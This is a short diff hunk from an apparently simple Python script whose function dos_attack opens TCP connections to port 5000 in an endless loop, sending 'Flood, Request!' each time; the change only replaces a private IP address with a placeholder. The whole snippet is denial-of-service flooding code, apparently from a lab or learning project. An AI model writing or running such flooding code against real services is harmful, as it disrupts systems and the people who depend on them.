@@ -4,7 +4,7 @@ def dos_attack():
     while True:
         try:
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client_socket.connect(('192.168.165.135', 5000))
+            client_socket.connect(('client-ip-address', 5000))
             client_socket.send(b"Flood, Request!")
             
             client_socket.close()
